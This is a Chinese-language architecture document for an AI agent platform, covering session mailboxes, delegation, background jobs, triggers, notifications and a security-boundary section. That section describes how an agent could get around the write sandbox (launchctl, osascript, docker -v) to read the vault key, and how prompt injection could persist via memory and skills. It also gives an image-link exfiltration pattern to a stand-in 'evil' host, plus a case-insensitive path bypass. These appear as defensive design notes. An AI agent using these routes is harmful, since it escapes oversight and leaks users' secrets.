- **工作状态**（`activity::work_states_in`，唯一规则；会话列表、issue 看板、触发器防重叠、`list_threads` 都用它）：`running` = 有没结束的运行，或信箱里有按唤醒规则（`actor::should_run`）要处理的信；`waiting` = 运行停了但在等外面的结果（有 active 占用，或还能回答的提问、还能批准的调用）；否则 `idle`。running 与 waiting 都是「没做完」，结果回来会自动接着做，所以除了展示各处只区分 idle 与否。批量计算，查询次数与会话数无关；挂起的调用只可能在最后一条回复里，只读那之后的消息。挂起的提问没人在外面做事，不挡删除（`blocking_deletion_in`）。
- **等待项**（#298，`activity::waits_of_in`）：waiting 的原因——后台任务、委派、到点唤醒、提问、等批准，与工作状态同一次读算出，所以显示「等待中」时一定列得出原因；认不出的占用者是缺陷，直接报错。会话页列出它们并可看日志、结束任务、停止 thread。

### thread 与结果路由

委派都是「往某个 thread 的信箱投一封信」，thread 由自己的 actor 运行。`delegate_task` 发起方立即继续，回答推送给用户、发起方拿不到；加 `report_back=true` 则不推送，作为事件交回发起会话（第 8 节）；`ask_agent` 发起方停在这次调用上等（见「挂起的调用」），回答作为调用结果交回，用户插话那次的回答推给用户。

- **thread** = 父会话 + agent + 名字（唯一）；模型只用 agent 名 + thread 名，同名即续聊、对方上下文保留，与用哪个工具开的无关（#294）。
- **界面上 thread 显示在开出或续写它的那次调用处**：会话领域在开 thread 的同一事务里记下「哪次调用开了哪个 thread」（`thread_calls`），只看调用 id、不看结果由谁产出，所以停止、中断、跳过等任何结果路径都不用补记（#251）。
- **推送按信件、不按会话**：每封信带「用户是否在等它的回答」，一次运行处理过的信里有用户在等的就推送；否则不推，agent 可自己 `notify_user`。
- **回答交给谁**（`Audience`，在 `platform::tooling`，不入库）：运行开始时按它处理的信件推导一次——有用户在等是 `user`；会话有委派来、还没结清的工作是 `agent`（做完时最终回答在结清里交回发起方）；否则 `none`。发起方被停止后没人再等，之后的运行是 `none`（#630）。它决定 `ask_user` 能否调用与运行上下文怎么说；运行中途才到的用户消息照样处理、收尾推送，但这次运行的工具与指令不变。
- **删除**（删会话与删 agent 唯一的规则，`sessions/src/deletion.rs`）：一个事务删除；它开出的 thread 保留（父引用置空）；忙时拒绝；交给它的未结清委派以「被删除」交回发起方；发布 `SessionDeleted`，其他领域各自清理引用。

### 占用与结清

- **占用**（`sessions/src/holds.rs`）：别的领域替某个会话开始一项异步工作（后台任务 `job:<id>`、到点唤醒 `wake:<会话>:<调用>`、委派）时在会话上登记一个占用。会话只知道「有人替我在外面做事」，不知道是什么事。**占用即委派进行状态**：委派结清没有不另记，就看发起方引用它的占用是否还 active。占用行永久保留，状态 `active`（进行中：会话没做完、算忙、不能删）/ `released`（结局已交回，与信件同一事务）/ `cleared`（被放弃：会话停止或自己取消，之后到的结局一律不投）。带 `call_id` 的占用表示结局要作为那次挂起调用的结果交回；「这次调用已交出去」= 有带这个 `call_id` 的占用（不论状态），是永久事实。
- **交回结局**（`work::deliver_in`，唯一出口）：与释放占用同一事务；发起方还停在对应的挂起调用上 → 回答信件，否则 → 事件信件（「迟到的回答改为事件」只在这里）；占用已 cleared 或会话已删除不投；与结局的记录同一事务，所以每项占用只交回一次，已 released 的再交回当场报错。
- **运行中检查（心跳）**：每项并发工作按发起时的 `heartbeat_seconds` 到期就向发起会话投一封检查信件（不推送），写明可选动作；同一来源已有信在排着或占用不再 active 时不投，所以不会堆积。委派的检查由 actor 的节拍循环（5 秒）发，后台任务的由工作区的节拍发。检查信件显式标记（`RUN_CHECK_INS`），界面据此合成「仍在进行 · 已检查 N 次」，不靠匹配文字。
- **到点唤醒**（`wake_me`，#261，`sessions/src/wakeups.rs`）：会话等待的一种，与后台任务、委派同类：约一个时刻和一句给自己的说明，登记占用，会话因此是 waiting（issue 不算停滞、委派来的工作不结清）；到点由节拍循环经 `deliver_in` 投事件信件并释放占用。是否到点只看库里的时刻与占用状态，重启不丢。一个会话至多一个：再约就取代，用户停止会话时清掉。能用脚本轮询的外部事件用后台任务跑检查循环，只能隔段时间看一眼的才用它。
- **结清**（`sessions/src/settlement.rs`）：会话自己判断委派什么时候结束，在同一事务里经 `deliver_in` 把结局交回发起方；只交回占用还 active 的，所以每项委派只结清一次。时机各一个入口：**完成**（运行正常结束、没停在挂起调用上、信箱没有待交的信、没有 active 占用）、**最终失败**（含交给这次运行但还没处理的信；同事务唤醒运行开始后才到的信，发布 `RunFailed`；这个收尾自己出错时只记下失败，见 3.3）、**停止 / 删除**。**事件与接口**：发布 `RunEnded`（只带事实：来源、回答、是否停止、停在哪类挂起调用上、有没有用户在等）、`RunFailed`、`SessionStopped`、`SessionDeleted`，订阅方（通知、issue、工作区）各自决定怎么用；别的领域在自己的事务里调 `SessionWork` 的 `hold_in` / `abandoned_in` / `ended_in` / `checked_in`（后台任务的占用、放弃、结局与检查）、`SenderInbox::receive_in`（触发器与 issue 的来信）。

### 挂起的调用（`ask_user`、`ask_agent` 与等批准的调用，`sessions/src/pending.rs`）

三者是同一件事：**模型调用了一个要等别人回信的工具**（工具返回 `ToolError::Defer`，或工具执行前要用户批准）。agenter 停在这里交回 `Step::Paused`，运行正常结束，不占着 actor；回信是一封回答信件，下一次运行把它作为那次调用的结果交回，模型看到的就是「我问了，对方这样答」。三种的差别只写在 `Waiting` 的几个方法里，各处查它，不按工具名或种类分支（#574）：要不要占用才算挂起、没交出去时能否原样重放、停止时是否仍挂着、没等到回答就继续时给什么结果（`sessions/src/answers.rs`）。一次调用是哪一种只经 `kind_of` 认：ask_user、ask_agent 按工具名，等批准的按记录（同一个工具多数调用不用批准）。

- **会话停在哪**（`pending::position`，纯函数，唯一判断）：由最后一条回复起的历史、交出去的永久事实（`HandedOut`）与信箱推导出空闲 / 新开 / 从历史续跑 / 被打断 / 等回答之一。actor、唤醒、停止、交回结局都 match 它，不各自组合谓词。挂起的调用由历史推导、不另存状态，且只可能在历史末尾。
- **什么时候继续**（`Paused::ready`，唯一规则）：用户发了新消息，或挂起的调用都有了回答；事件留在信箱里等它们一起交给模型。**跳过与迟到**：未处理的调用后不能追加消息，所以用户发新消息时没回答的 `ask_user` 记为「没回答」，`ask_agent` 记为「还在处理，回答会作为事件送达」；之后才到的回答作为一段用户消息交给模型，不丢也不卡住。`ask_agent` 续跑时按调用 id 幂等，不重复投信。
- **等批准的调用**（#530，`sessions/src/approvals.rs`）：目前只有 `skill_run` 跑 SKILL.md `approval:` 里列出的脚本（按脚本、不按参数；列出的不是目录里的文件则 skill 不加载，否则会静默变成不用批准）。运行停下时把这些调用连同请求批准时定下的 pin 记进 `approval_requests`；批准的是**一份内容**（pin = skill 目录指纹），执行前指纹变了就不执行、让模型重新请求。批准被运行取走过一次后再被取走，说明上次可能执行到一半：不再执行，给「被中断」，保守但不会重复执行。等批准的运行不论有没有人在等都推送（只有用户能批）。**始终允许**（#531，`workspace/src/grants.rs`）由 `skill_run` 自己记（批准随 agenter 的 `Approval::always` 交回工具）：同一 agent、脚本、参数、secret 与目录指纹（不含 SKILL.md）才算同一调用，存库（`script_grants`）不放资源目录（否则 agent 能自批），用户在设置页查看、撤销。
- **`ask_user`**：做法同 Claude Code 的 AskUserQuestion，一次 1–4 个选择题、总能填「其他」。工具总是列出，只在 `Audience::User` 时可用，否则按 Audience 说明拒绝原因交还模型（不隐藏，以免破坏缓存）。回答随消息提交并当场校验，存成回答信件；条目状态由后端唯一投影给出，前端不解析结果文本。

### 附件与文件

- 做法同 IM 的媒体仓库（Matrix、Slack files）：先上传得到 id，消息里只放引用（`/api/files/<id>/<名称>`）；文件内容在数据库里没有副本。
- **两种形态**（`runtime/src/attachments.rs`）：存储形态是消息里的文件引用（库、界面、重放都用它）；每次请求模型前才展开成模型形态（说明 + 可内联图片的内容），只替换这一次请求的消息，历史不变。工具交回的图片（MCP 截图、`read_file` 读图）也在写进历史前换成引用，同一出口展开。**图片在这个唯一出口按 provider 上限整理**（`runtime/src/images.rs`）：历史里的图片每次请求都要再发，一张超限或损坏就让会话之后每次都 400（#336），所以原件不动、发送时整理；长图沿长边切段而不整张缩小（缩小后字看不清）。agenter 只认图片和 PDF，其余附件必须先展开成说明。
- **交给工具**：信件交给模型时把附件复制到工作目录 `uploads/<id>/<名称>`，是派生副本。**agent 发出文件**：`share_file` 存快照并挂在工具结果的 metadata 上（`TOOL_ATTACHMENTS`，不发给模型、随消息持久化），所以文件一定显示给用户，不依赖模型在回答里转写引用；`ask_agent` 对方挂的文件随调用结果一起交给用户。**一致性**（`files` 领域）：先写临时文件再改名，最后插元数据行；没有 id 就没有引用，孤儿只占空间；启动时清掉进程中途被杀留下的临时文件。

### 会话信箱（`sessions/src/mailbox.rs`、`sessions/src/run.rs`）

每个会话是一个**信箱**加一个 **actor**。一切要交给 agent 的东西（用户消息、提问回答、触发器与委派的任务、后台任务结局与检查、thread 交回的结果）都是按到达顺序投进信箱的信件。信箱里有要处理的信就开始一次**运行**（输入都在信箱里，信交给了哪次运行记在信上的 `taken_by`）；每次请求模型前把这期间新到的信接在工具结果后面一起交出（同 Claude Code，两次工具调用之间就能处理）；模型不再调用工具时运行结束，还有信就接着跑。异步工作发起后立即返回，结局与检查都只是往发起方信箱投信。事件在请求里是独立一段（来源写在段里），段号记在请求 metadata（`RUN_EVENTS`），界面据此单独显示，不从文字反推。

- **每一步保存**：一步 = 一次模型请求及其返回的工具调用。请求前，请求与它带上的信件（记为已处理）同一事务提交；回复后提交回复；工具做完，结果与新到的信并成下一条请求再提交。失败或重启从上一步续跑（第 5 节）。停在挂起调用上时，已执行完的工具结果先存成一条请求，继续时把它们连同回答交回 agenter，只把新出的结果接在后面存（库里的消息不改写，#571）。**库里的历史就是交给模型的历史**（唯一差别：本次运行新增的工具调用在内存里留着要脱敏参数的明文，执行要用，存库的那份脱敏，#770）：agenter 不改历史、不合成工具结果；没结果的调用只可能在最后一条回复里（`conventions::unanswered_calls`），平台在运行开头补齐。上下文超过压缩阈值时，这一步照常保存，然后停下压缩、重新加载续跑（第 11 节）。
- **从哪里开始**（按 `pending::position`）：停在挂起的调用上时交回回答（或跳过）；停在没得到回复的请求上就重发它。停在带工具调用的回复上（执行工具时被打断）时**不重新执行这些调用**：副作用可能已经发生而无从知道（事故 2026-10-21：一条 `run_shell` 重启了服务，恢复的运行重放它又重启，循环 66 次）。改为补上「被中断、没有重新执行，可能已生效，先查再决定」的结果（metadata `MADE_UP`），经保存一步的同一路径写进历史，由模型自己决定。唯一例外是没结果的调用全是还没交出去的 `ask_agent`（按调用 id 幂等）时重新执行；有一个不能重放就整步补结果。
- **续跑接管**：一次运行最终失败后，新到的信件唤醒新运行，它从失败处续跑并接管那次处理过的信件（推送由它做）。**唤醒**（`actor::should_run`，唯一规则）：有排着的信、没有没结束的运行，且不是「排着的信都已交给过最近一次最终失败的运行」；停在挂起调用上还不能继续时不唤醒。这样最终失败的运行不会因同一批信被无限重新投递。投信、运行结束、最终失败时都在提交后叫醒，叫醒只是「去看一眼」，要不要跑由 actor 按库判断，所以叫醒丢了（如进程被杀）也由启动时的 `resume` 补上，没有别的对账。**记录**：已处理与被丢弃的信件只作记录（内容已随消息保存）；界面显示排队中的信和最近一次停止丢弃的信。
## 8. 委派（`sessions/src/delegation.rs`）
做法同 Claude Code 的子 agent。`ask_agent` 与 `delegate_task(report_back: true)` 是要交回结局的委派；普通 `delegate_task` 不交回（`send_in`），只往 thread 投一封用户在等的信。委派的唯一主体是发出它的那次调用的 `thread_calls` 行（按发起会话与调用 id 唯一，续跑重做调用时幂等）；发起方上的占用（active / released / cleared）记它还要不要交回，信件只引用这一行。「发出」与「交回」是两个对称的事务，没有中间状态、事件或投递顺序要证明。
- **发出**（`dispatch_in`，一个事务）：打开或找到 thread（同一 agent 同名续聊，不论哪个工具开的），在调用行记下心跳间隔，在发起方登记占用，往 thread 投一封信。`ask_agent` 随后挂起调用，没有心跳也没有超时（#307）。
- **交回**（`hand_back_in`）：在 thread 结清的同一事务里交回结局并释放占用，释放即结清，所以只交回一次。发起方还停在那次 `ask_agent` 上时作为工具结果交回，否则是一封事件信件；thread 的回答不直接推送给用户，由父会话按 `awaited` 决定。发起方被停止时清掉占用并逐层停止下游 thread，已 cleared 的结局不再投。
- **检查**（`check_threads`）：report_back 的委派按自己的间隔给发起方投检查信件，说 thread 的工作状态。`list_threads` 不按最近一次运行判断做没做完：thread 在等它自己开出的工作时，最近的回答只是中间结果。
## 9. 后台任务（`workspace/src/jobs.rs`）
做法同 Claude Code 的后台 bash：`run_shell(background: true)` 立即返回任务 id，不占住运行、不设时限、不限频率与任务数（用户定）；前台 `run_shell` 也不设上限，`timeout` 由模型自估。任务属于发起它的会话，结束与运行中检查都作为事件信件投进会话（检查不推送，agent 据此决定继续等还是 `job_kill`），等待期间在会话上是一个等待项，界面上可结束。job 行永久保留。
- **输出**：stdout/stderr 合并、逐块脱敏（secret 跨块也不漏）写进工作目录的 `jobs/<id>.log`，agent 用 `read_file` 读全文，事件里只带最后几行。以进程退出为准而不是管道关闭：退出后限时读完，留在后台的后代照常结束并附说明、不杀（#337：等管道 EOF 会因命令里一个 `&` 挂到超时）；前台 shell 与前置检查共用。stream 命令例外：它反复重启，退出就杀整组，免得后代越积越多。
- **以 agent 身份起命令**（#618，`workspace/src/commands.rs`）：前后台 shell、`skill_run`、前置检查与 stream 只经一个入口，它一次拼好 secret 注入、工作目录与写沙箱，并给出被沙箱拦下时补的说明；别的领域不碰沙箱与 vault。进程自成进程组，结束与关停杀整棵树。
- **启动**：先起进程，再在一个事务里写任务行并在会话上登记占用，之后交给照看者；写不下来就杀掉进程、失败作为工具结果返回，没有「有行无进程」的时候。整个启动在独立的 tokio 任务里一气做完（第 4 节）。
- **照看与结局**：一个任务从起来到结局写进库一直由它的照看者管，结局只由照看者写，与交回会话（投事件信件、释放占用）在同一事务（会话已被停止时结局照记、不投信）；`job_kill`、会话停止、关停只杀进程组并说明结局算什么。
- **中断与重启**：正常关停杀掉所有任务的进程组，由照看者记为被中断并交回会话（事件在重启后处理）；照看者没写下结局（被强杀、崩溃、写库失败）的行停在 running，下次启动时、起任何任务之前（`jobs.run()` 先 `recover`）记为被中断并告诉 agent 怎么核实：进程可能还活着、pid 可能已被复用，所以不盲杀。
## 10. 删除 agent（`assets/src/lifecycle.rs`）
1. **发起与清理（一个事务）**：标为正在删除（不出现在列表与名称解析里），依次调组合根登记的各领域删除钩子（`DeletionHook`），在同一个事务里清理：会话领域删它的全部会话，发现忙的就报 Conflict（409）整个回滚；issue 改为未指派、无负责人；触发器、脚本的始终允许删除。各领域为 agent 写数据库前在同一事务里检查它是否可用（`active_agent_in`），正在删除的按不存在处理；资源快照带着正在删除的名单，往它名下写记忆、skill、secret、MCP 或转给它当场报不存在，平台的写入口也拒绝改它目录里的文件（shell 直接写的不经过写入口，#660），不会写成功后随目录静默消失；它的目录照常可读。
2. **删除文件（提交后）**：删工作目录；它名下仍被别人用着的资源（base 或别的 agent 的规则收录）挪到 platform/，其余随资源目录删除（加载失败的目录也按名字删，#550）；删 access.toml 里它的那一节；最后删这一行。文件不在事务里：失败时报错给调用方，agent 停在正在删除，服务启动时（`resume_deletions`）接着删；每一步重做时已不在即空操作；工作目录删不干净只记 warning，不能让 agent 卡在正在删除。

**归档**（#219）是可来回切换的停用，数据都留着，只在空闲（各领域登记的归档检查 `ArchiveBlocker` 都说不挡）、且不是默认 agent 时可做。「可用」分两级：没在删除就能改配置与资源，另外没归档才能接新工作（`runnable_agent_in`）；派新工作的入口（来信、新会话、issue 指派、触发器）都经同一条规则，投不进的原因由收信方给出，不按错误类型猜（#572、#631）。触发器遇到归档：定时的跳过，一次性的推送告诉用户没做，流式的事件丢弃、取消归档后不补；指派给它的 in_progress issue 标为停滞，提醒转派。有意不挡：手动压缩与人工重试最终失败的运行；检查与标记之间插进的运行照常做完。
## 11. 上下文压缩
- **统一自己实现**（`sessions/src/compaction.rs`）：不用提供方的原生压缩，否则按提供方分支会有两套语义。上一次模型请求的输入 token（含缓存部分）超过全局阈值（`compaction_threshold_tokens`，#645 删了会话级阈值）时，由 actor 在步与步之间压缩：运行开始时（确认有事要做之后）与每次请求模型之前；会话页也可手动压缩（排在当前运行之后，记一条压缩的运行记录）。该不该压缩只看 `verdict`：只认最近一次压缩之后报告了用量的回复；压缩后第一次回复就超阈值说明保留窗口本身就超了，本次运行不再压缩，超出模型上限时失败可见。模型不返回 usage 时记 warn，自动压缩对它失效。
- **执行**：把最近 `compaction_keep_steps` 步之前的消息连同上一份摘要交给该 agent 的模型总结（`Runtime::summarize`，无工具的一次文本生成）。切点只落在不拆开工具调用与结果、挂起调用与回答的地方，运行中途也有切点（每一批工具结果之后），长任务运行中也能压缩；单次取长度上限内的最早若干步，不截断内容，剩下的接着压。
- **使用**：上下文 = 最新摘要（放进 instructions）+ 切点之后的原始消息（`history::load_context`）。原始消息不删，界面显示全文并标出压缩点；会话页显示「上下文 现在 / 阈值」（#600），「现在」就是压缩判断看的那个数；平台不知道模型标称窗口，所以上限显示压缩阈值。
## 12. 数据库迁移
- **表结构**：每个领域在自己的 crate 里给出一串 SQL（`platform::db::Migration`），按领域在 `schema_versions` 表记版本；组合根的 `MIGRATIONS` 列出全部领域。启动时（`platform::db::migrate`）在一个 `BEGIN IMMEDIATE` 事务里把每个领域升到最新，期间关外键防级联删除，提交前跑 `foreign_key_check`，任何一步失败整个回滚、什么都不留；库里某领域的版本比代码新（装回了旧版）时拒绝启动。已部署的数据只经迁移升级，不删库。
- Python 版旧库到 Rust 版的一次性迁移工具（#688，`server/crates/migrate`）在切换完成后已删除（#775），要看从 git 历史取。
## 13. 进化机制
- **Skill**：agent 在任何运行里都能在自己的资源目录建 `skills/<名>/SKILL.md`，新建的归自己、只有自己用，要给别人用就加进角色。名字全局唯一：与平台同名的只加载平台那份，agent 之间同名的都不加载并报出（#502）。
- **归属与分发**（#365、#498，规则只在 `assets/src/access.rs`）：每个资源有 owner（所在目录的 agent，或平台）。owner 是隐含的专属角色，对自己的资源有 use 与 write、不可删——否则建资产要隐式改规则、删后规则悬空、同名重建误授权。别人能否 use / write 看规则（base + 角色 + 自己的 allow / deny，deny 只拦规则分来的）；私有记忆只有不限种类的 `write:*` 管得到（#635）。「收录」只有一个定义：规则放行 use。转移 owner（#238）就是把文件挪到新 owner 的目录。agent 直接改文件时能不能写由写沙箱回答（#499，`access::write_scope`）。分发不是安全隔离（第 15 节）。
- **Memory**：记忆是资源目录里的 markdown 文件，同一套归属与分发：能 use 的每块每次运行全文放进 instructions，能 write 的才能改。全局记忆归平台、人人可读、admin 改、不能删；共享记忆由角色分给一组 agent 共用共改（内容相同才合在一起，改出冲突说明该拆开）；私有记忆 `<agent>/memory.md` 只它自己与 admin 改、不分发。每块有字数上限（`memory_max_chars`）：经写入口超长且比原来长才拒绝，用 shell 写超的照常加载并报出要缩短。
- **自我进化**：平台不在运行之间插入强制反思（#116 删了每 N 步的 reflection）。agent 改记忆与 skill 都在会话里直接改文件，谁、为什么改留在会话记录里（没有版本表，#498）。定期整理由 trigger 驱动、按 base 角色里的 skill 执行（每日 self-evolve，之后 curator 做跨 agent 上提与冲突裁决），不是平台机制。
## 14. 触发源与通知
**统一入口**：用户消息、触发器、issue、委派都是同一件事——把一段内容投进某个会话的信箱。各来源只做适配（鉴权、时机、组装内容），入口类型只含它用得上的字段，不合用的组合构造不出来；最后都经会话领域唯一的来信入口（`sessions/src/inbound.rs`），新建会话也只有一处实现（`create_session_in`）。别的领域投信先得到「投得进」（`Accepted`）或「投不进 + 原因」（`Refused`：归档、不在了、不准续写），由发送方逐种决定反应。用户可以续写任何会话，其他来源只能续写自己发起的（否则 403）。issue 按（来源、发送方、agent）定位会话，来信在发送方的事务里投（事务串行），保证每个（issue, agent）只有一个会话。

是否推送只看信件的 `awaited`，由入口设置：用户发起或回复为是；触发器为否（要通知时 agent 调 `notify_user`）；`delegate_task` 为是、report_back 时否；`ask_agent` 为否（回答作为工具结果）。

**触发器**（`triggers` 领域）：具名、持久的事件来源。公共字段只有名称、agent、说明、启用、已结束与最近一次触发；怎么触发由 `kind` 在代码里多态实现（`TriggerKind`），表里不为某种方式开专门的列（`config`、`state` 都是 JSON）。所有激活机制只经一个出口触发（`TriggerService::fire_activated`，先跑前置检查；「立即运行」同一条路）；加一种方式 = 一个 `TriggerKind` + 它的激活机制，在 `TriggerDomain::build` 里登记一行，表、工具、入口不用改，前后端按 kind 穷举，漏了编译器会报。记下触发与投信在同一事务，恰好一次；事件内容附在处理说明后的 `<event>…</event>` 里。任何改动提交后通知激活机制，它们按最新的行重新对账。
- **schedule / once**（共用 `due::DueRunner`，两者的差别只在 `DueRule`）：一个循环扫描到期的，先提交「消耗这次到期」（定时推进、一次性结束）再触发——前置检查不能占着事务，所以进程死在两者之间时跳过这一次，**至多一次**。触发并发跑、不阻塞扫描（#576）。**防重叠**：上一次触发没做完（含前置检查在跑、尚无会话时，靠内存集合）只消耗不触发；上次开出的会话不空闲就跳过本次（#627）。连续跳过要看得见：状态显示「已跳过 N 次」，挡路会话在等待（可能永远等不到）时每轮通知用户一次。停机期间错过的只补一次，暂停期间的不补；状态坏了只停用这一个。
- **stream**（`stream::StreamRunner`）：平台托管一条常驻命令，stdout 每行一个事件；配置变了才重起（按 generation），停用、删除、关停杀整个进程组。退出按指数退避重启（1 秒起、最长 5 分钟），偶尔重连是常态，连续快速失败 3 次才算脚本出错，稳定 60 秒算恢复。stderr 逐块脱敏写进工作目录 `trigger-logs/<名称>.stderr.log`（超过 1 MiB 轮换）。事件先防抖，上一次会话不空闲就继续排队，空闲后合并成一次触发；队列满就不再读管道、让命令自己阻塞——不重叠、不丢、内存有界。排队事件不持久化，重连、去重、游标由命令负责（skill `triggers`）。
- **已结束**：一次性触发器到期被消耗即结束，不论之后是否真投递；结束后不在默认列表、不能改或运行、可删，名称只在未结束的之间唯一，行与 id 永久保留，开过的会话一直查得到来源。「立即运行」是管理操作，不消耗一次性那次到期。
- **前置检查**（`triggers/src/precheck.rs`）：同 Hermes 的 script 模式，先跑一条便宜、确定性的命令，有事才调 agent。用 `bash -o pipefail`（否则 `curl … | jq` 里 curl 失败会变成静默的「没事」），在事务外执行，时限 `precheck_timeout_seconds`（写进工具说明；它从起命令算起，之前认可写路径另有 10 秒时限，见第 15 节「写沙箱」，超时同样记故障）。`output`：输出非空才触发，输出替换事件；`changed`：与上次成功输出比，变了才触发并附 diff，首次只记基线。检查期间触发器被改则结果作废；两次检查并发最坏多触发一次，不加锁。不提供 no_agent 直推：它绕过「一切都经过会话」。
- **脚本出错**（#580，`triggers/src/faults.rs`）：前置检查失败与流式命令连续失败都是 agent 写的脚本坏了，记在一处（同来源只留最新一条），触发器保持启用（故障常是暂时的）。从正常变为出错时给所属 agent 开新会话告警一次，由它修、用户不当中转；投不进就退给用户推送，不静默吞掉。来源恢复即清除，人工改配置或重新启用清全部；不加「连续 N 次才告警」阈值。「立即运行」的检查失败只报给调用方，免得 agent 验证脚本时开出告警会话。

**通知**（`notifications` 领域）：只有 Web Push；只能拉取的外部源用定时触发器拉。来源：在等的回答（订阅 `RunEnded`：停在批准上的总推，其余要 `awaited` 且做完或在问用户，被停止的不推）、运行最终失败（订阅 `RunFailed`，截到 500 字的错误；中途的工具报错由 agent 处理）、`notify_user`、别的领域在自己事务里经 `notify_in` 发的（告警兜底、定时被挡、issue 交给用户）、开启推送时的测试。会话未读不另存：有指向它的未读通知就是未读，所以正常跑完不通知的定时会话不算未读。点通知的跳转不只靠消息：iOS 主屏应用挂起或冷启动时消息会丢，所以 Service Worker 先把目标 url 写进 Cache Storage 再广播，页面加载或回到前台时去取。
- **推送**（`notifications/src/push.rs`、`webpush.rs`）：写下通知的事务提交后（`Tx::on_commit`），每条通知、每台设备一个独立的 tokio 任务去发。暂时失败（断网、超时、408/429/5xx）只重试这一台，在内存里退避（5 秒起翻倍、最长 5 分钟一次），从第一次失败起约 30 分钟后放弃（本机到推送服务的网络常断十几分钟，#208）；404/410 删订阅；其他 4xx 不删也不重试。每次尝试前重读通知与订阅：通知随会话删了、设备退订或已失效被删了就不再推；角标取发出那一刻的未读数。最终失败（被拒、重试放弃）只记 error 日志，由错误监控看见。**接受的代价**（#675、#682 认可）：重试只在内存里，服务恰好在重试期间重启，这条推送就不发了（通知本身和未读角标都还在）；同一会话的推送不保证按顺序到（断网恢复后可能后一条先到，Service Worker 按会话替换通知，锁屏上停在前一条，点开会话即看到全部），不为它加队列。
- **协议**：加密（RFC 8291，aes128gcm）与 VAPID 签名（RFC 8292）用 RustCrypto 自己写（web-push crate 依赖 OpenSSL，本仓库不链接 OpenSSL：Homebrew 升级后服务会起不来），沿用 Python 版的 VAPID 私钥，设备不用重新订阅。日志只记推送服务的主机，不记 endpoint（订阅凭据）。
- **出站 HTTP**（`platform/src/net.rs`）：模型、网页、语音、推送共用一个客户端，照 macOS 系统代理设置走（含例外列表：本机、局域网直连）。本机直连不了部分境外服务（如 fcm.googleapis.com，#682）；reqwest 自带的系统代理不读例外列表，打开后连本机的模型网关也会绕进代理，所以自己读一次系统设置。只在启动时读：改了系统代理要重启服务。
## 15. 安全边界
**威胁模型：agent 与运行服务的系统用户同等可信。** agent 能执行任意命令，故意绕开（如经 launchctl 让沙箱外的进程代读）就能读到服务能读的一切，包括 vault 主密钥、LLM key 与数据库。下面的措施只防 secret **意外**进入对话、日志和前端，以及误操作，不防 agent 本身：**工具权限与分发只防误操作、省上下文，不是安全隔离**。要真正隔离，得让服务以独立系统用户运行，把配置与数据放到 agent 读不到的地方。
- **secret**：shell 只继承少量环境变量；注入的 secret 在输出里替换为 `[secret:KEY]`（逐字匹配）；`vault_set` 参数持久化前脱敏，但用户在 prompt 里写的明文原样保存，敏感值应在 Vault 页录入。Vault 用 Fernet（与 Python 版同一种密文），主密钥缺失或格式错拒绝启动；日志不打印 secret 与 token，HTTP 客户端每个请求的日志（URL 里可能带代入的 secret）只留 WARN 以上。平台私有文件（配置及其副本、备份、推送私钥，#539）对非 admin 连读内容都禁止，任何授权放不开；数据库不在内，很多 agent 正当地读它（#537）。
- **提示注入**：处理外部内容的 agent 用 deny 收窄工具、不分给它用不到的 MCP 与 secret；base 没有管理类工具，改不了别人的资产与全局记忆。注入还可能写进记忆与 skill 而持久化（全局记忆会带进每个 agent）；缓解靠改动留在会话记录、备份带着 assets/、每日知识审查。

**写沙箱（#416）：防误删误写，不防故意绕过。** agent 的命令（前后台 shell、前置检查、stream）、MCP stdio server 及所有子进程关在操作系统沙箱里，只能写它的可写路径；`write_file` / `edit_file` 按同一份路径检查（`workspace/src/writable.rs`）。读、网络、进程不受限。对 agent 无感：工具与提示词都不提它，范围内的行为与输出与不关沙箱逐字相同；越界只给原本的系统报错，再补一句被谁拦下、该找谁或要哪条授权。
- **可写路径**：工作目录 + 默认可写的几类（临时、缓存、工具链等）− 受保护的（平台自身的安装等）+ `write:path:<目录>` 授权 − deny − 整棵资源树 + 树里它能改的 − 平台私有文件，后面的覆盖前面的。资源树只按归属，祖先目录的授权放不开它，所以 agent 改不了自己的权限，「能不能改某项资源」完全由沙箱回答（#499）。路径授权是字面目录、不走 fnmatch，`write:*` 不含路径；每次起命令或写文件现算，改授权下一条命令就生效。现算要读文件系统（换真实路径），限时 10 秒（#722）：macOS 上碰到要授权的目录（如 iCloud 云盘）而系统在等授权弹窗时这一步不返回，到时这条命令或写报错并说卡在哪个路径；同一 agent 同时只有一处在算，卡住期间后来的直接等到时限报错，不再占新的阻塞线程。
- **路径比较**全平台只经 `platform::fs::real`（#570）：换成盘上真实大小写——APFS 默认不分大小写，按字符串比会被 `~/.MULIAO/CONFIG.toml` 绕过。**MCP stdio server** 也包进使用者的沙箱，否则写一个 MCP 配置就能让平台在沙箱外替它跑命令。
- **执行层**（`platform/src/sandbox.rs`）按系统一个适配器，现只有 macOS（`sandbox-exec` + 生成的 SBPL，`Seatbelt`）；setuid 程序与自建沙箱的程序（`ps`、Chromium）放到沙箱外。没有适配器时启动即报错，不退回不隔离；`write_sandbox = "report"` 只记录不拦，供上线前试跑。已知缺口（接受）：同名资源两边都不加载、`docker -v` 与 launchctl / osascript 代执行、沙箱外程序不受限。

**其他边界**：
- **Web 登录**（`http/src/auth.rs`）：单用户密码，HMAC 签名 cookie 90 天；签名 key 由密钥与密码摘要派生，改密码即吊销全部 cookie，没有服务端会话表；算法与 cookie 格式和 Python 版相同。登录失败按来源 IP 退避（#540，只在内存）：第 5 次起等 30 秒翻倍、最长 15 分钟，期间连对的也拒。只采信本机受信代理带的 `X-Forwarded-For`；tailnet 成员直连也表现为 127.0.0.1，算可信。
- **不可信内容约定**：agent 写的文件都按不可信处理（能写任意 HTML/SVG）。下载一律 `nosniff` + `CSP: sandbox`，只有 png/jpeg/gif/webp inline，其余作附件，不在本站执行；工作目录与 skill 目录浏览同样处理，路径解析符号链接后必须仍在目录内（只防误走出去）。回答里只渲染指向 `/api/files/` 的图片，外链显示为链接，防注入的输出用 `![](https://evil/?d=…)` 外带对话。
- **agent 自定义页面**（#355，`workspace/src/sites.rs`）：agent 写 `site/<页面>/index.html`，界面「页面」列出、iframe 打开。要能跑脚本又不能与界面同源：响应带 `CSP: sandbox allow-scripts`（不含 allow-same-origin），读不到 cookie、调不了 `/api`；页面与同目录文件凭签名 URL 访问（与 cookie 同一把 key），`no-referrer` 免带出签名。平台不运行 agent 的服务：实时数据由触发器或常驻脚本写文件、页面轮询。
- **配置文件**（`~/.muliao/config.toml`，`platform/src/config.rs`）是唯一配置来源，不读环境变量；未知键直接报错，避免拼写错误被静默忽略（Python 版的 `runtime.task_max_attempts`、`task_retry_*`、`outage_retry_max_attempts` 随任务队列删掉，写了也报未知键）。`timezone` 读配置时按 IANA 名解析，写错启动即报错。
## 16. 部署形态与边界
